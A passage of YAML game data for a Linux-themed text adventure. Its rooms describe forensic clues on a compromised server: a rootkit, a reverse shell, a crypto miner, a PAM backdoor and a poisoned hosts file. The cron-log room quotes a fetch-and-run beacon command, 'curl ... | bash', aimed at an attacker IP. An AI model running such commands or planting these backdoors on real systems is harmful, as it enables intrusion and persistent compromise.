    description_seed: "Block devices. sda, sdb, loop0 through loop7. Each shows partitions, size, I/O statistics. sda is the system disk. sdb appeared recently — a USB drive that was plugged in and quickly removed. Evidence?"
    connections:
      east: {room: sys, type: open}
      south: {room: sys_block_sda, type: open}
      west: {room: sys_block_sdb, type: open}

  sys_block_sda:
    name: "/sys/block/sda"
    description_seed: "The primary disk. 500GB. Three partitions: sda1 (boot, 512MB), sda2 (root, 480GB), sda3 (swap, 20GB). I/O statistics show heavy write activity in the last 72 hours — the attacker has been busy."
    connections:
      north: {room: sys_block, type: open}

  sys_block_sdb:
    name: "/sys/block/sdb"
    description_seed: "A phantom disk. The device appeared briefly — long enough to mount and copy files — then disappeared. The kernel log shows 'USB Mass Storage device detected' followed by 'device disconnected' 4 minutes later. Someone used a USB drive."
    connections:
      east: {room: sys_block, type: open}

  sys_kernel:
    name: "/sys/kernel"
    description_seed: "Kernel parameters exposed through sysfs. Security settings, debug flags, module information. Some security parameters have been weakened — kptr_restrict is 0 (kernel pointers exposed), dmesg_restrict is 0."
    connections:
      south: {room: sys, type: open}
      east: {room: sys_kernel_security, type: open}
      west: {room: sys_kernel_debug, type: open}

  sys_kernel_security:
    name: "/sys/kernel/security"
    description_seed: "The Linux Security Modules interface. AppArmor profiles, SELinux booleans, audit rules. SELinux is in permissive mode — logging violations but not enforcing. The attacker disabled enforcement to avoid being blocked."
    connections:
      west: {room: sys_kernel, type: open}
    items: [selinux_armor]

  sys_kernel_debug:
    name: "/sys/kernel/debug"
    description_seed: "debugfs. Kernel debugging information. ftrace, kprobes, memory allocator stats. The ftrace log shows function calls — including calls from the rootkit module intercepting sys_getdents64 (the readdir system call, hiding files)."
    connections:
      east: {room: sys_kernel, type: open}

  sys_firmware:
    name: "/sys/firmware"
    description_seed: "Firmware interfaces. ACPI tables, EFI variables, DMI data. The ACPI tables are standard. The EFI variables show Secure Boot is disabled — another vector the attacker could exploit for persistence below the OS."
    connections:
      south: {room: sys_kernel, type: open}

  sys_module:
    name: "/sys/module"
    description_seed: "Loaded kernel modules. Each module has a directory: parameters, refcnt, holders. The 'rootkit' module is listed. Its parameters show which files and PIDs it's configured to hide."
    connections:
      east: {room: sys_kernel, type: open}

  # ===========================================================================
  # /run — runtime data (6 rooms)
  # ===========================================================================

  run:
    name: "/run"
    description_seed: "Runtime volatile data. tmpfs — everything here vanishes on reboot. PID files, socket files, lock files, systemd runtime state. A snapshot of what's running right now."
    connections:
      south: {room: root_fs, type: open}
      east: {room: run_systemd, type: open}
      west: {room: run_lock, type: open}
      north: {room: run_user, type: open}

  run_systemd:
    name: "/run/systemd"
    description_seed: "Systemd's runtime state. The system journal, unit states, session tracking. loginctl shows active sessions — including session c3, owned by 'backdoor', logged in from 10.0.0.99. Still active."
    connections:
      west: {room: run, type: open}

  run_lock:
    name: "/run/lock"
    description_seed: "Lock files for running services. LCK..ttyS0, subsys/. A lock file named '.update-helper.lock' sits here — the reverse shell's lock, preventing multiple instances."
    connections:
      east: {room: run, type: open}

  run_user:
    name: "/run/user"
    description_seed: "Per-user runtime directories. /run/user/1000 (guest), /run/user/0 (root). A directory for UID 0 exists with a strange systemd scope — the backdoor user's session, running as root."
    connections:
      south: {room: run, type: open}

  run_udev:
    name: "/run/udev"
    description_seed: "udev runtime data. Device events, rules state, hardware database. The udev rules include a custom rule that triggers when a USB device is inserted — it copies the device contents to /tmp/.hidden/usb-exfil."
    connections:
      west: {room: run, type: open}

  run_sshd:
    name: "/run/sshd"
    description_seed: "OpenSSH daemon runtime. The sshd PID file, host keys loaded at startup. sshd is running with the compromised configuration — root login enabled, password auth enabled, the attacker's key in authorized_keys."
    connections:
      east: {room: run, type: open}

  # ===========================================================================
  # /usr/share — shared data (7 rooms)
  # ===========================================================================

  usr_share:
    name: "/usr/share"
    description_seed: "Architecture-independent shared data. Man pages, documentation, locale files, icons, terminfo. The collected wisdom of the system — if you know where to look."
    connections:
      south: {room: usr, type: open}
      east: {room: usr_share_man, type: open}
      west: {room: usr_share_doc, type: open}

  usr_share_man:
    name: "/usr/share/man"
    description_seed: "Manual pages. man1 through man8. Thousands of pages documenting every command, every system call, every configuration file. Knowledge is power. A man page for 'update-helper' has been added — the attacker documented their own backdoor."
    connections:
      west: {room: usr_share, type: open}
      south: {room: usr_share_man_man8, type: open}

  usr_share_man_man8:
    name: "/usr/share/man/man8"
    description_seed: "Section 8 — system administration commands. iptables.8, sshd.8, useradd.8. The essential reading for any sysadmin. Deep knowledge of these tools is your greatest weapon."
    connections:
      north: {room: usr_share_man, type: open}

  usr_share_doc:
    name: "/usr/share/doc"
    description_seed: "Documentation for installed packages. READMEs, changelogs, license files. The changelog for libpam-modules shows the last legitimate update was 6 months ago — before the compromise."
    connections:
      east: {room: usr_share, type: open}
      south: {room: usr_share_doc_openssh, type: open}

  usr_share_doc_openssh:
    name: "/usr/share/doc/openssh-server"
    description_seed: "OpenSSH documentation. Configuration examples, security best practices, upgrade notes. A sticky note is attached: 'REMINDER: Disable PasswordAuthentication before going to production.' Ignored, apparently."
    connections:
      north: {room: usr_share_doc, type: open}

  usr_share_locale:
    name: "/usr/share/locale"
    description_seed: "Locale data. Translations, character sets, time zones. Everything needed to present the system in any language. Strangely, a new locale 'zh_CN.UTF-8' was installed recently. The system doesn't serve Chinese users."
    connections:
      north: {room: usr_share, type: open}

  usr_share_terminfo:
    name: "/usr/share/terminfo"
    description_seed: "Terminal capability databases. xterm, vt100, screen, tmux. The ancient knowledge of how to talk to terminals. Each entry describes escape codes, color capabilities, cursor movement. Low-level communication."
    connections:
      east: {room: usr_share, type: open}

  # ===========================================================================
  # /var expanded — cache, backups, tmp (10 rooms)
  # ===========================================================================

  var_cache:
    name: "/var/cache"
    description_seed: "Application caches. apt package cache, DNS cache, font cache. Caches speed things up but also retain information. The apt cache shows recently downloaded packages: netcat, socat, nmap, python3-pip."
    connections:
      north: {room: var, type: open}
      east: {room: var_cache_apt, type: open}
      west: {room: var_cache_dns, type: open}
    items: [cache_hit]

  var_cache_apt:
    name: "/var/cache/apt"
    description_seed: "The APT package cache. .deb files for every package installed or upgraded. The cache reveals the attacker's tool installation — timestamps show netcat, socat, and nmap were installed within minutes of the initial compromise."
    connections:
      west: {room: var_cache, type: open}

  var_cache_dns:
    name: "/var/cache/dns"
    description_seed: "DNS cache. Recent lookups. Most are normal — debian.org, github.com. But several queries resolve to 'c2.darknet.onion' through a Tor exit node. The C2 domain, cached in plain sight."
    connections:
      east: {room: var_cache, type: open}

  var_backup:
    name: "/var/backups"
    description_seed: "System backups. dpkg package lists, passwd/shadow backups, old apt keyrings. The dpkg.list.0 backup is from before the compromise — comparing it to the current state reveals which packages the attacker installed."
    connections:
      south: {room: var, type: open}
      east: {room: var_backup_shadow, type: open}

  var_backup_shadow:
    name: "/var/backups (shadow backup)"
    description_seed: "A backup of /etc/shadow from before the compromise. Comparing it to the current shadow file reveals the 'backdoor' user was added. The backup doesn't contain it. Clean evidence of when the account was created."
    connections:
      west: {room: var_backup, type: open}

  var_tmp:
    name: "/var/tmp"
    description_seed: "Persistent temporary files. Unlike /tmp, these survive reboots. The attacker knows this — compiled binaries and persistence scripts live here, carefully hidden among legitimate apt temp files."
    connections:
      east: {room: var, type: open}
    enemies: [segfault_daemon_2]

  var_log_daemon:
    name: "/var/log/daemon.log"
    description_seed: "Daemon log. Every background service reports here. The update-helper service logs its startup: 'Connecting to 10.0.0.99:4444...' followed by 'Connection established.' The reverse shell announcing itself."
    connections:
      south: {room: var_log, type: open}

  var_log_cron:
    name: "/var/log/cron.log"
    description_seed: "Cron execution log. Every scheduled task is logged here. The malicious cron job runs every 5 minutes: 'CMD (curl -s http://10.0.0.99/beacon.sh | bash)'. A beacon script, checking in with the C2 server."
    connections:
      east: {room: var_log, type: open}

  var_log_lastlog:
    name: "/var/log/lastlog"
    description_seed: "Last login records. The 'backdoor' user last logged in from 10.0.0.99 at 2:17 AM, 71 hours ago. The 'root' user was accessed via su from the 'backdoor' session 30 minutes later. A timeline of the compromise."
    connections:
      west: {room: var_log, type: open}

  # ===========================================================================
  # /home expanded — backup user, more detail (6 rooms)
  # ===========================================================================

  home_backup:
    name: "/home/backup"
    description_seed: "The backup operator's home. Automated backup scripts run from here — rsync, borg, restic. The backup logs show the last successful backup was 4 days ago — before the compromise. A clean backup exists."
    connections:
      south: {room: home, type: open}
      east: {room: home_backup_data, type: open}

  home_backup_data:
    name: "/home/backup/data"
    description_seed: "Backup data. Compressed archives of the entire system, taken daily. The pre-compromise backup is gold — it contains the original, untampered binaries. You could restore from here."
    connections:
      west: {room: home_backup, type: open}
    items: [clean_backup]

  home_guest_tmp:
    name: "/home/guest/tmp"
    description_seed: "Your personal temp directory. Scratch files, test scripts, downloaded files. Normal working detritus. Nothing suspicious here — this is the one clean corner of the system."
    connections:
      east: {room: home_guest, type: open}

  home_admin_docs:
    name: "/home/admin/docs"
    description_seed: "Admin documentation. Network diagrams, runbooks, incident response procedures. A document titled 'Security Audit — 6 months ago' lists every vulnerability that was supposed to be fixed. None were."
    connections:
      west: {room: home_admin, type: open}
    items: [audit_report]

  home_dev_docker:
    name: "/home/dev/docker"
    description_seed: "The developer's Docker configuration. Dockerfiles, compose files, .env files with API keys and database passwords. The .env file contains production database credentials in plaintext."
    connections:
      north: {room: home_dev, type: open}

  home_attacker_tools:
    name: "/home/.hidden/tools"
    description_seed: "The attacker's compiled tools. Custom builds of chisel (tunnel tool), pspy (process spy), linpeas (privilege escalation scanner). Well-organized. Professional. This wasn't a script kiddie — this was methodical."
    connections:
      north: {room: home_attacker, type: open}

  # ===========================================================================
  # /mnt and /media — mounted filesystems (6 rooms)
  # ===========================================================================

  mnt:
    name: "/mnt"
    description_seed: "Mount points. Temporary mounts for removable media and network filesystems. Two mounts are active: a USB drive and an NFS share from another server."
    connections:
      east: {room: root_fs, type: open}
      south: {room: mnt_usb, type: open}
      west: {room: mnt_nfs, type: open}

  mnt_usb:
    name: "/mnt/usb"
    description_seed: "A mounted USB drive. Contains a directory called 'evidence' — someone was collecting forensic artifacts. Disk images, memory dumps, network captures. Someone started an investigation but didn't finish it."
    connections:
      north: {room: mnt, type: open}
      east: {room: mnt_usb_evidence, type: open}
    items: [usb_drive]

  mnt_usb_evidence:
    name: "/mnt/usb/evidence"
    description_seed: "Forensic evidence collected onto the USB drive. A pcap file shows the initial exploit — a serialized Java object in an HTTP POST to the legacy app. The attacker's IP, the payload, the timestamp. Proof."
    connections:
      west: {room: mnt_usb, type: open}
    items: [pcap_evidence]

  mnt_nfs:
    name: "/mnt/nfs"
    description_seed: "An NFS mount from 192.168.1.10 — the file server. Read-only access. Contains shared documents, team repositories, and deployment artifacts. The NFS export is too permissive — root_squash is disabled."
    connections:
      east: {room: mnt, type: open}
      south: {room: mnt_nfs_share, type: open}

  mnt_nfs_share:
    name: "/mnt/nfs/shared"
    description_seed: "Shared network files. Deployment scripts, configuration templates, team documentation. One deployment script has been modified — it includes a backdoor that runs on every deploy to the web server."
    connections:
      north: {room: mnt_nfs, type: open}

  media:
    name: "/media"
    description_seed: "Automount directory for removable media. Empty now — the USB drive was manually mounted at /mnt/usb. A ghost directory from a previous mount: 'RECOVERY_DISK'. Someone tried to boot from recovery media."
    connections:
      east: {room: root_fs, type: open}

  # ===========================================================================
  # /dev expanded (5 rooms)
  # ===========================================================================

  dev_tty:
    name: "/dev/tty"
    description_seed: "The controlling terminal. Your window into the system. Characters flow in, characters flow out. The terminal is the oldest interface — older than GUIs, older than networks, older than most operating systems."
    connections:
      north: {room: dev, type: open}

  dev_shm:
    name: "/dev/shm"
    description_seed: "Shared memory. A tmpfs filesystem for inter-process communication. Fast, volatile, dangerous. The attacker left a shared memory segment containing the decryption key for their C2 communications. Sloppy."
    connections:
      east: {room: dev, type: open}
    items: [c2_decrypt_key]

  dev_loop:
    name: "/dev/loop"
    description_seed: "Loop devices. Block devices backed by files — used for mounting disk images. loop0 is active, mounting a suspicious .img file from /tmp/.hidden. It contains the attacker's encrypted filesystem."
    connections:
      west: {room: dev, type: open}

  dev_mapper:
    name: "/dev/mapper"
    description_seed: "Device mapper. LVM logical volumes, encrypted LUKS partitions, dm-crypt. The system's disk encryption infrastructure. A new mapper device 'attacker_vol' was created — an encrypted volume for storing stolen data."
    connections:
      south: {room: dev_sda, type: open}

  dev_urandom:
    name: "/dev/urandom"
    description_seed: "The non-blocking random source. Less random than /dev/random, but never blocks. Used by most applications for key generation, nonces, salts. The entropy pool flows like a lazy river."
    connections:
      north: {room: dev_random, type: open}

  # ===========================================================================
  # /proc expanded (6 rooms)
  # ===========================================================================

  proc_cpuinfo:
    name: "/proc/cpuinfo"
    description_seed: "CPU information. 4 cores, Intel Xeon E5-2680, 2.70GHz. Hyperthreading enabled. The processor flags include 'vmx' — hardware virtualization support. The system could be running VMs. Is it?"
    connections:
      east: {room: proc, type: open}

  proc_meminfo:
    name: "/proc/meminfo"
    description_seed: "Memory statistics. 16GB total, 12GB used, 2GB cached, 2GB free. Suspiciously high usage for a server with modest workloads. The cryptocurrency miner is eating memory."
    connections:
      west: {room: proc, type: open}

  proc_mounts:
    name: "/proc/mounts"
    description_seed: "Currently mounted filesystems. /, /boot, /tmp, /dev/shm, and... a mount that doesn't belong: /tmp/.hidden/attacker.img on /tmp/.hidden/mnt type ext4. The attacker's encrypted filesystem, mounted and accessible."
    connections:
      south: {room: proc, type: open}

  proc_loadavg:
    name: "/proc/loadavg"
    description_seed: "System load average. 3.72 2.91 2.45. The 1-minute average is nearly 4 — on a 4-core system, that means 100% CPU utilization. The cryptocurrency miner is consuming every available cycle."
    connections:
      north: {room: proc, type: open}

  proc_modules:
    name: "/proc/modules"
    description_seed: "Loaded kernel modules. Standard modules: ext4, nfs, iptable_filter. And one that shouldn't be there: 'rootkit 16384 0 - Live'. Loaded, active, hiding files and processes at the kernel level."
    connections:
      east: {room: proc_sys, type: open}

  proc_interrupts:
    name: "/proc/interrupts"
    description_seed: "Hardware interrupt counters. IRQ assignments and counts. The network interface is generating an unusual number of interrupts — consistent with high-volume data transfer. The exfiltration in progress."
    connections:
      west: {room: proc_sys, type: open}

  # ===========================================================================
  # /tmp expanded (4 rooms)
  # ===========================================================================

  tmp_systemd_private:
    name: "/tmp/systemd-private"
    description_seed: "Systemd's private temp directories. Isolated namespaces for service temp files. Each service gets its own /tmp that other services can't see. Except the attacker's service — it runs without PrivateTmp."
    connections:
      north: {room: tmp, type: open}

  tmp_x11:
    name: "/tmp/.X11-unix"
    description_seed: "X11 display server sockets. Unix domain sockets for the X Window System. On a headless server, these shouldn't exist. But they do — the attacker set up X11 forwarding for a graphical tool."
    connections:
      south: {room: tmp, type: open}

  tmp_apt:
    name: "/tmp/apt-dpkg"
    description_seed: "APT's temporary working directory. Package extraction, dpkg staging. Evidence of recent package installation — the attacker's tools were installed through apt, leaving traces here."
    connections:
      east: {room: tmp, type: open}

  tmp_miner:
    name: "/tmp/.hidden/miner"
    description_seed: "A cryptocurrency mining directory. The miner binary, its configuration (mining pool address, wallet ID), and a wrapper script that restarts it if killed. The wallet address is a trail to the attacker's identity."
    connections:
      south: {room: tmp_hidden, type: open}
    items: [miner_config]
    enemies: [crypto_miner]

  # ===========================================================================
  # /usr expanded (6 rooms)
  # ===========================================================================

  usr_include:
    name: "/usr/include"
    description_seed: "C header files. stdio.h, stdlib.h, unistd.h — the interface definitions for the C standard library. The foundational contracts that every program on this system was built against."
    connections:
      east: {room: usr, type: open}

  usr_src:
    name: "/usr/src"
    description_seed: "Source code. Kernel headers for the running kernel, downloaded source packages. A modified kernel source tree is here — the rootkit's source code, left behind by the attacker. Sloppy, or deliberate?"
    connections:
      west: {room: usr, type: open}
    items: [rootkit_source]

  usr_games:
    name: "/usr/games"
    description_seed: "Games. fortune, cowsay, bsdgames. Even on a compromised server, fortune dispenses wisdom: 'In the land of the blind, the one-eyed man is king.' Apt, given the trojaned binaries in /usr/bin."
    connections:
      south: {room: usr, type: open}
    items: [fortune_cookie]

  usr_lib_python3:
    name: "/usr/lib/python3"
    description_seed: "Python 3 standard library. The attacker's scripts are written in Python — they imported requests, paramiko (SSH), and cryptography. The installed packages tell the story of the attack tools."
    connections:
      south: {room: usr_lib, type: open}

  usr_sbin_iptables:
    name: "/usr/sbin/iptables"
    description_seed: "The iptables binary. The firewall management tool. Currently useless — all rules have been flushed. But the binary itself is intact, untrojaned. It can be used to restore the firewall."
    connections:
      east: {room: usr_sbin, type: open}

  usr_bin_coreutils:
    name: "/usr/bin (coreutils)"
    description_seed: "Core utilities. cp, mv, rm, chmod, chown. The bedrock commands. Checksums verify these are untampered — the attacker only trojaned the information-gathering tools (ls, ps, netstat), not the action tools."
    connections:
      south: {room: usr_bin, type: open}
    items: [kill_nine]

  # ===========================================================================
  # /opt expanded (4 rooms)
  # ===========================================================================

  opt_monitoring_prom:
    name: "/opt/monitoring/prometheus"
    description_seed: "Prometheus metrics database. Time-series data for CPU, memory, disk, network. The dashboards show a clear inflection point 72 hours ago — CPU jumped to 100%, outbound traffic spiked, new processes appeared."
    connections:
      east: {room: opt_monitoring, type: open}

  opt_monitoring_grafana:
    name: "/opt/monitoring/grafana"
    description_seed: "Grafana dashboards. Beautiful visualizations of system health — all screaming red. High CPU, high network, disk I/O through the roof. The alert history shows 47 unacknowledged critical alerts."
    connections:
      west: {room: opt_monitoring, type: open}

  opt_legacy_deploy:
    name: "/opt/legacy-app/deploy"
    description_seed: "Deployment scripts for the legacy app. deploy.sh, rollback.sh, health-check.sh. The deploy script was last run 72 hours ago — by the 'backdoor' user. They deployed a modified version of the application."
    connections:
      east: {room: opt_legacy, type: open}

  opt_legacy_data:
    name: "/opt/legacy-app/data"
    description_seed: "Application data. Upload directories, session files, temporary data. The upload directory contains PHP files — web shells uploaded through the application's file upload feature. No input validation."
    connections:
      west: {room: opt_legacy, type: open}
    enemies: [web_shell_guardian]

  # ===========================================================================
  # /srv expanded (4 rooms)
  # ===========================================================================

  srv_git_repos:
    name: "/srv/git/repos"
    description_seed: "Individual git repositories. The application repo, the infrastructure repo, the documentation repo. Git log shows the attacker committed to the infrastructure repo — modifying the Terraform that provisions new servers."
    connections:
      east: {room: srv_git, type: open}

  srv_git_hooks:
    name: "/srv/git/hooks"
    description_seed: "Git server-side hooks. post-receive hooks trigger deployments. The attacker added a post-receive hook that installs the backdoor on every new server provisioned through git push. Supply chain infection."
    connections:
      south: {room: srv_git, type: open}

  srv_docker_volumes:
    name: "/srv/docker/volumes"
    description_seed: "Docker volumes. Persistent data for containers. The 'miner' volume contains a cryptocurrency mining container's configuration. It starts automatically via a docker-compose file in the attacker's hidden directory."
    connections:
      south: {room: srv_docker, type: open}

  srv_docker_images:
    name: "/srv/docker/images"
    description_seed: "Docker images. The local image cache. Along with legitimate images (nginx, postgres, redis), there's an image tagged 'utils:latest' — it's a container with the attacker's full toolkit pre-installed."
    connections:
      north: {room: srv_docker, type: open}

  # ===========================================================================
  # /lost+found and miscellaneous (4 rooms)
  # ===========================================================================

  lost_found:
    name: "/lost+found"
    description_seed: "The filesystem's recovery area. Files recovered after a crash or fsck — orphaned inodes, corrupted files, fragments. Rarely visited. A recovered file fragment contains part of the attacker's initial exploit payload."
    connections:
      west: {room: root_fs, type: open}
    items: [recovered_fragment]

  lost_found_deep:
    name: "/lost+found (deep)"
    description_seed: "Deeper in lost+found. More recovered fragments. A partial log file from the initial compromise — timestamps, commands, the attacker's first steps on the system. Invaluable forensic evidence."
    connections:
      north: {room: lost_found, type: open}

  # ===========================================================================
  # Shortcut corridors and hidden passages (6 rooms)
  # ===========================================================================

  pipe_shortcut_var_usr:
    name: "Pipe Tunnel (var↔usr)"
    description_seed: "A UNIX pipe connecting /var to /usr. Data flows through here — log entries being processed by tools. Walking through the pipe is faster than traversing the directory tree."
    connections:
      east: {room: var, type: open}
      west: {room: usr, type: open}

  symlink_etc_proc:
    name: "Symlink Passage (etc↔proc)"
    description_seed: "A symbolic link creates a shortcut between /etc and /proc. Configuration informs the running system; the running system reflects configuration. A natural bridge."
    connections:
      north: {room: etc, type: open}
      south: {room: proc, type: open}

  hardlink_usr_opt:
    name: "Hard Link Corridor (usr↔opt)"
    description_seed: "A hard link — two directory entries pointing to the same inode. /usr and /opt share this passage. Unlike a symlink, this connection cannot be broken by removing one end."
    connections:
      north: {room: usr_local, type: open}
      south: {room: opt, type: open}

  dev_proc_bridge:
    name: "Device-Process Bridge"
    description_seed: "Where /dev meets /proc. Device files are created by the kernel, process info is exposed by the kernel — they share the same origin. This bridge lets you move quickly between hardware and software views."
    connections:
      east: {room: dev, type: open}
      west: {room: proc, type: open}

  inode_tunnel:
    name: "Inode Tunnel"
    description_seed: "A passage through the inode table itself. Below the directory tree, below the filesystem, where data blocks are addressed by number. Fast travel for those who know the system's internals."
    connections:
      north: {room: root_fs, type: open}
      south: {room: root_home, type: locked}

  # ===========================================================================
  # Additional rooms to reach 200 (22 rooms)
  # ===========================================================================

  etc_hosts:
    name: "/etc/hosts"
    description_seed: "The hosts file. Static hostname-to-IP mappings that override DNS. Someone added an entry: '10.0.0.99 updates.debian.org'. Any attempt to reach the real Debian update server is silently redirected to the C2 server. Poisoned."
    connections:
      east: {room: etc, type: open}

  etc_resolv:
    name: "/etc/resolv.conf"
    description_seed: "DNS resolver configuration. nameserver 8.8.8.8, nameserver 1.1.1.1. Standard public DNS. But a third entry has been added: nameserver 10.0.0.99. The attacker's DNS server, intercepting queries for their domains."
    connections:
      west: {room: etc, type: open}

  etc_fstab:
    name: "/etc/fstab"
    description_seed: "The filesystem table. Which filesystems mount where at boot. A new entry mounts an NFS share from 10.0.0.99 at /mnt/backup — the attacker added a persistent connection to their infrastructure."
    connections:
      north: {room: etc, type: open}

  etc_network:
    name: "/etc/network/interfaces"
    description_seed: "Network interface configuration. eth0 configured with a static IP. A second interface definition — tun0 — has been added, configured to establish a VPN tunnel to 10.0.0.99 on boot."
    connections:
      south: {room: etc_ssh, type: open}

  etc_logrotate:
    name: "/etc/logrotate.d"
    description_seed: "Log rotation policies. Each file defines how long logs are kept, how they're compressed, when they're rotated. The attacker modified the auth.log policy — it now rotates daily and keeps only 1 day. Evidence destruction on a schedule."
    connections:
      north: {room: etc_cron_d, type: open}

  proc_version:
    name: "/proc/version"
    description_seed: "The kernel version string. Linux 5.15.0-91-generic. Compiled with GCC 11.4.0. The kernel is two minor versions behind — security patches are available but not applied."
    connections:
      east: {room: proc_1, type: open}

  proc_cmdline:
    name: "/proc/cmdline"
    description_seed: "The kernel command line from boot. BOOT_IMAGE=/vmlinuz root=/dev/sda2 ro quiet splash. Normal boot parameters. No evidence of kernel-level tampering — the rootkit was loaded after boot via modprobe."
    connections:
      west: {room: proc_1, type: open}

  proc_filesystems:
    name: "/proc/filesystems"
    description_seed: "Supported filesystems. ext4, tmpfs, nfs, overlay, fuse. The 'overlay' entry is significant — Docker uses it. The attacker's mining container is running on an overlay mount."
    connections:
      south: {room: proc_self, type: open}

  dev_stderr:
    name: "/dev/stderr"
    description_seed: "Standard error. Where warnings and errors are sent. In the UNIX Catacombs, stderr is your friend — error messages reveal what's happening beneath the surface. A debug log streams past."
    connections:
      west: {room: dev_tty, type: open}

  dev_stdin:
    name: "/dev/stdin"
    description_seed: "Standard input. Where data enters a process. The source of all commands, all queries, all interaction. You are stdin — every command you type flows through here."
    connections:
      east: {room: dev_tty, type: open}

  var_lib_dpkg:
    name: "/var/lib/dpkg"
    description_seed: "The dpkg database. Package state for every installed package — name, version, status, checksums. Comparing installed file checksums to the database reveals which binaries have been tampered with. Three mismatches: ls, ps, netstat."
    connections:
      south: {room: var_lib, type: open}

  var_lib_apt:
    name: "/var/lib/apt"
    description_seed: "APT state. Package lists, extended states, auto/manual install markers. The 'extended_states' file shows netcat, socat, and nmap were manually installed 72 hours ago — not as dependencies of anything legitimate."
    connections:
      north: {room: var_lib, type: open}

  usr_share_zoneinfo:
    name: "/usr/share/zoneinfo"
    description_seed: "Timezone data. Every timezone in the world, from Africa/Abidjan to Zulu. The system timezone is set to UTC — standard for servers. The attacker's login timestamps are in UTC too, giving no clue about their location."
    connections:
      south: {room: usr_share, type: open}

  usr_lib_security:
    name: "/usr/lib/security"
    description_seed: "PAM modules. pam_unix.so, pam_deny.so, pam_permit.so, pam_rootok.so. The modified pam_unix.so contains a hardcoded password — 'master_key_2024'. Any user can authenticate with this password. A PAM backdoor."
    connections:
      north: {room: usr_lib, type: open}
    enemies: [pam_backdoor]

  tmp_crash:
    name: "/tmp/crash"
    description_seed: "Crash reports. Apport and whoopsie crash data. Several crashes from the past 72 hours — the cryptocurrency miner occasionally segfaults under heavy load and restarts itself."
    connections:
      west: {room: tmp, type: open}

  opt_java:
    name: "/opt/java"
    description_seed: "Java Runtime Environment. JRE 8 Update 65 — ancient. CVE-2015-4852, the infamous Java deserialization vulnerability, is present. This is the vulnerability the attacker used for initial access."
    connections:
      north: {room: opt_legacy, type: open}

  srv_backup:
    name: "/srv/backup"
    description_seed: "Server backup storage. Borg backup repository, backup schedules, retention policies. The backups run nightly. The attacker hasn't touched them — they either don't know about them or don't care."
    connections:
      south: {room: srv, type: open}

  home_guest_history:
    name: "/home/guest/.bash_history"
    description_seed: "Your command history. Everything you've typed. Scrolling back reveals commands you don't remember typing — the injected .bashrc eval ran commands in your session context without your knowledge."
    connections:
      north: {room: home_guest_bashrc, type: open}

  proc_net_tcp:
    name: "/proc/net/tcp"
    description_seed: "Raw TCP connection table. Hex-encoded local and remote addresses, connection state, socket inode numbers. Entry 7: local 0100007F:1159, remote 630000A:115C, state 01 (ESTABLISHED). The reverse shell, encoded in hex."
    connections:
      east: {room: proc_net, type: open}

  sys_class_misc:
    name: "/sys/class/misc"
    description_seed: "Miscellaneous device classes. fuse, device-mapper, snapshot. The 'fuse' device is busy — the attacker is using FUSE to mount their encrypted filesystem without needing kernel modules."
    connections:
      west: {room: sys_class, type: open}

  var_spool_cron:
    name: "/var/spool/cron"
    description_seed: "User crontabs. Per-user scheduled tasks separate from the system crontabs in /etc/cron.d. The 'backdoor' user has a crontab: @reboot /usr/local/bin/update-helper. The reverse shell, restarting on every boot."
    connections:
      east: {room: var_spool, type: open}

  boot_initrd:
    name: "/boot/initrd"
    description_seed: "The initial ramdisk. Contains the minimal filesystem and drivers needed to boot the system before the real root filesystem is mounted. If the attacker modifies this, they own the system before the OS even starts."
    connections:
      south: {room: boot, type: open}

  secret_root_passage:
    name: "Root Escalation Shaft"
    description_seed: "A vertical shaft from the depths to /root. Requires the Sudo Token to ascend. The walls are carved with privilege escalation techniques: SUID binaries, capabilities, kernel exploits. A sysadmin's ladder."
    connections:
      down: {room: etc_pam_d, type: open}
      up: {room: root_home, type: locked}

